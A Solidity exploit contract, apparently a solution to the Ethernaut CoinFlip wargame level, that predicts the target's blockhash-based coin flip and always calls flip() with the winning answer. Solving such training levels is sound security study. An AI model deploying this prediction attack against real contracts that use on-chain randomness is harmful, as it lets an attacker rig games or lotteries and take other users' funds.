// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../ethernaut/CoinFlip.sol";

contract HackCoinFlip {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip private _coinFlipContract;

    constructor(address coinFlipContractAddress) {
        _coinFlipContract = CoinFlip(coinFlipContractAddress);
    }

    function guaranteeGuess() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;

        if (coinFlip == 1) {
            _coinFlipContract.flip(true);
        } else {
            _coinFlipContract.flip(false);
        }
    }
}
